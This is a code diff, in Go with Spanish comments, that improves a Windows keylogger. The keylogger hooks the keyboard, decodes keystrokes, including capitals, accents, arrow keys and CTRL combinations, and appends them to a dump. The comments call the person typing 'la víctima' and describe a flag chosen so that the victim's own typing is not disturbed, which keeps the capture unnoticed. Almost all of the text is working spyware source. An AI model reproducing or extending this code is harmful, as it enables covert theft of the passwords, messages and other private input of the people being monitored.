@@ -33,8 +33,20 @@ const (
 	// no es gratis y no hace falta mirarlo cada medio segundo.
 	hookHealth = 3 * time.Second
 
+	// toUnicodeNoStateChange es el bit de wFlags que impide que ToUnicodeEx
+	// toque la tecla muerta del sistema (el acento pendiente de la víctima).
+	toUnicodeNoStateChange = 0x04
+
 	vkControl = 0x11
 )
+
+// modifierVKs son las teclas cuyo estado consulta ToUnicodeEx.
+var modifierVKs = [...]uint32{
+	0x10, 0xA0, 0xA1, // Shift, LShift, RShift
+	0x11, 0xA2, 0xA3, // Control, LControl, RControl
+	0x12, 0xA4, 0xA5, // Alt, LAlt, RAlt (AltGr)
+	0x14, // CapsLock
+}
 
 var (
 	procSetWindowsHookExW        = user32.NewProc("SetWindowsHookExW")
@@ -165,6 +177,14 @@ func (k *Keylogger) record(kb *kbdllHookStruct) {
 			sink.Append(event)
 			return
 		}
+		// CTRL+flecha mueve por palabras dentro de la página: sin esto el
+		// modificador se perdía y quedaba un [RIGHT] suelto.
+		if label, ok := specialLabel(kb.VkCode); ok && ctrlComposable(label) {
+			event.IsSpecial = true
+			event.Label = ctrlCombo(label)
+			sink.Append(event)
+			return
+		}
 	}
 
 	if label, ok := specialLabel(kb.VkCode); ok {
@@ -198,19 +218,26 @@ func (k *Keylogger) decode(kb *kbdllHookStruct) (rune, bool) {
 	if res, _, _ := procGetKeyboardState.Call(uintptr(unsafe.Pointer(&state[0]))); res == 0 {
 		return 0, false
 	}
+	// GetKeyboardState lee el estado del hilo que llama, y el hilo del hook no
+	// recibe el mensaje de teclado: sin refrescar los modificadores aquí, una
+	// mayúscula o una eñe salían como minúscula o como [VK:0xNN].
+	fillModifierState(&state)
 
 	k.mu.Lock()
 	layout := k.layout
 	k.mu.Unlock()
 
 	var buf [8]uint16
+	// El flag 0x04 evita que ToUnicodeEx consuma la tecla muerta del sistema:
+	// con él, pulsar '´' y luego 'e' sigue dando 'é' en la ventana de la
+	// víctima en vez de comerse el acento.
 	n, _, _ := procToUnicodeEx.Call(
 		uintptr(kb.VkCode),
 		uintptr(kb.ScanCode),
 		uintptr(unsafe.Pointer(&state[0])),
 		uintptr(unsafe.Pointer(&buf[0])),
 		uintptr(len(buf)),
-		0,
+		uintptr(toUnicodeNoStateChange),
 		layout,
 	)
 	if int32(n) <= 0 {
@@ -222,6 +249,32 @@ func (k *Keylogger) decode(kb *kbdllHookStruct) (rune, bool) {
 		r = utf16.DecodeRune(r, rune(buf[1]))
 	}
 	return r, true
+}
+
+// fillModifierState refresca en el array de estado los modificadores que
+// ToUnicodeEx consulta para componer mayúsculas, acentos y símbolos.
+func fillModifierState(state *[256]byte) {
+	for _, vk := range modifierVKs {
+		res, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
+		value := int32(res)
+		if value&0x8000 != 0 {
+			state[vk] |= 0x80
+		}
+		if value&0x0001 != 0 {
+			state[vk] |= 0x01
+		}
+	}
+	// Win32 mantiene sincronizados el genérico y sus dos variantes laterales,
+	// pero un hook puede leer el que quedó marcado: se cubren los tres.
+	if state[0xA2]&0x80 != 0 || state[0xA3]&0x80 != 0 {
+		state[0x11] |= 0x80
+	}
+	if state[0xA0]&0x80 != 0 || state[0xA1]&0x80 != 0 {
+		state[0x10] |= 0x80
+	}
+	if state[0xA4]&0x80 != 0 || state[0xA5]&0x80 != 0 {
+		state[0x12] |= 0x80
+	}
 }
 
 // ctrlDown pregunta por el estado real del modificador en este instante.
@@ -249,7 +302,9 @@ func ctrlLabel(vk uint32) (string, bool) {
 	return "", false
 }
 
-// specialLabel mapea las teclas que nunca producen texto.
+// specialLabel mapea las teclas que nunca producen texto. Falta una sola y el
+// dump se llena de [VK:0x27] ilegible: 0x27 es la flecha derecha, la tecla que
+// más se pulsa dentro de una página web.
 func specialLabel(vk uint32) (string, bool) {
 	switch vk {
 	case 0x0D:
@@ -264,11 +319,50 @@ func specialLabel(vk uint32) (string, bool) {
 		return "[ESC]", true
 	case 0x5B, 0x5C:
 		return "[WIN]", true
+	case 0x25:
+		return "[LEFT]", true
+	case 0x26:
+		return "[UP]", true
+	case 0x27:
+		return "[RIGHT]", true
+	case 0x28:
+		return "[DOWN]", true
+	case 0x24:
+		return "[HOME]", true
+	case 0x23:
+		return "[END]", true
+	case 0x21:
+		return "[PGUP]", true
+	case 0x22:
+		return "[PGDN]", true
+	case 0x2D:
+		return "[INS]", true
+	case 0x2C:
+		return "[PRTSC]", true
+	case 0x5D:
+		return "[MENU]", true
+	case 0x13:
+		return "[PAUSE]", true
+	case 0x90:
+		return "[NUMLOCK]", true
+	case 0x91:
+		return "[SCROLL]", true
 	}
 	if vk >= 0x70 && vk <= 0x7B {
 		return fmt.Sprintf("[F%d]", vk-0x6F), true
 	}
 	return "", false
+}
+
+// ctrlComposable dice si la etiqueta admite el prefijo CTRL+. Las de función y
+// navegación sí; [VK:0xNN] no, porque el prefijo no la vuelve más clara.
+func ctrlComposable(label string) bool {
+	return label != "" && label[0] == '[' && !strings.HasPrefix(label, "[VK:")
+}
+
+// ctrlCombo convierte [RIGHT] en [CTRL+RIGHT].
+func ctrlCombo(label string) string {
+	return "[CTRL+" + strings.TrimSuffix(strings.TrimPrefix(label, "["), "]") + "]"
 }
 
 func isModifierKey(vk uint32) bool {
